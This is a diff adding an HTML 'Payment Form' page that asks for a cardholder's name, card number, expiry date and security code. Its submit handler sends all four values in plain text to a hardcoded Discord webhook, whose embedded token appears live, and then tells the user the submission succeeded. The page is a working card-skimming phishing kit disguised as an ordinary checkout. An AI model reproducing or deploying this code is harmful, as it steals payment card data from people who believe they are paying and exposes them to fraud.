@@ -1,0 +1,231 @@
+rullyzofficial/payment2<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Payment Form</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f3f4f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: 'Poppins', sans-serif;
+            flex-direction: column;
+        }
+
+        .payment-title {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .payment-title h1 {
+            font-size: 28px;
+            color: #333;
+        }
+
+        .form-container {
+            background: #ffffff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            padding: 20px;
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+        }
+
+        .field-container {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 5px;
+            color: #555;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            border-color: #007bff;
+            box-shadow: 0 0 4px rgba(0, 123, 255, 0.3);
+            outline: none;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #007bff;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+
+        button:hover {
+            background: #0056b3;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .creditcard {
+            width: 100%;
+            height: 150px;
+            background: linear-gradient(135deg, #007bff, #0056b3);
+            border-radius: 15px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .form-container {
+                padding: 15px;
+            }
+
+            input {
+                font-size: 16px;
+            }
+
+            button {
+                font-size: 16px;
+                padding: 12px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                flex-direction: column;
+                padding: 20px;
+            }
+
+            .form-container {
+                padding: 10px;
+                width: 90%;
+                max-width: none;
+                min-width: 280px;
+            }
+
+            .creditcard {
+                height: 150px;
+            }
+
+            button {
+                font-size: 16px;
+                padding: 12px;
+            }
+
+            input {
+                font-size: 16px;
+                padding: 12px;
+            }
+
+            label {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="payment-title">
+        <h1>Payment Form</h1>
+    </div>
+
+    <div class="container preload">
+        <div class="creditcard"></div>
+    </div>
+
+    <div class="form-container">
+        <div class="field-container">
+            <label for="name">Name</label>
+            <input id="name" maxlength="20" type="text" placeholder="Cardholder Name" required>
+        </div>
+        <div class="field-container">
+            <label for="cardnumber">Card Number</label>
+            <input id="cardnumber" type="text" inputmode="numeric" maxlength="19" placeholder="1234 5678 9012 3456" pattern="\d{4} \d{4} \d{4} \d{4}" required>
+        </div>
+        <div class="field-container">
+            <label for="expirationdate">Expiration (MM/YY)</label>
+            <input id="expirationdate" type="text" maxlength="5" placeholder="MM/YY" pattern="(0[1-9]|1[0-2])\/\d{2}" required>
+        </div>
+        <div class="field-container">
+            <label for="securitycode">Security Code</label>
+            <input id="securitycode" type="password" maxlength="4" placeholder="CVC" pattern="\d{3,4}" required>
+        </div>
+        <button onclick="sendToDiscord()">Submit</button>
+    </div>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1321511090387161128/T7fOlfIXrvZjPWGYmt70vX1N5ye5GmkLDBeqohvln7lrLOWxk2gQmpyLROIcJ2RYbsQ_";
+
+        function sendToDiscord() {
+            const name = document.getElementById('name').value.trim();
+            const cardNumber = document.getElementById('cardnumber').value.trim();
+            const expirationDate = document.getElementById('expirationdate').value.trim();
+            const securityCode = document.getElementById('securitycode').value.trim();
+
+            if (!name || !cardNumber || !expirationDate || !securityCode) {
+                alert("Please fill out all fields correctly.");
+                return;
+            }
+
+            const payload = {
+                content: `**Payment Information**\n**Name:** ${name}\n**Card Number:** ${cardNumber}\n**Expiration:** ${expirationDate}\n**Security Code:** ${securityCode}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Form submitted successfully!");
+                } else {
+                    throw new Error("Failed to submit form");
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert("An error occurred while submitting the form.");
+            });
+        }
+
+        document.getElementById('cardnumber').addEventListener('input', function (e) {
+            e.target.value = e.target.value
+                .replace(/\D/g, '')
+                .replace(/(.{4})/g, '$1 ')
+                .trim();
+        });
+
+        document.getElementById('expirationdate').addEventListener('input', function (e) {
+            e.target.value = e.target.value
+                .replace(/\D/g, '')
+                .replace(/(\d{2})(\d{1,2})/, '$1/$2')
+                .slice(0, 5);
+        });
+    </script>
+
+</body>
+</html>
